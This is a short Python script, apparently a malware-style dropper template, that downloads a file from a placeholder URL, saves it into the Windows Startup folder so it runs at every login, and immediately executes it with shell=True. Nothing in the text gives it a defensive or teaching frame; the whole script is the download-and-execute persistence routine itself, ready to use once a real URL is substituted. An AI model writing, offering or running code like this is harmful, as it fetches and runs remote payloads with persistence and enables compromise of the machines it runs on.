# Download and execute a file in the startup folder

import os
import requests
import subprocess
import sys

# URL of the file to download
file_url = 'http://example.com/'
# Path to the startup folder
startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
# File name to save
file_name = 'yourfile.html'
# Full path to save the file
file_path = os.path.join(startup_folder, file_name)

# Download the file
response = requests.get(file_url)
with open(file_path, 'wb') as file:
    file.write(response.content)

# Run the file
subprocess.Popen(file_path, shell=True)
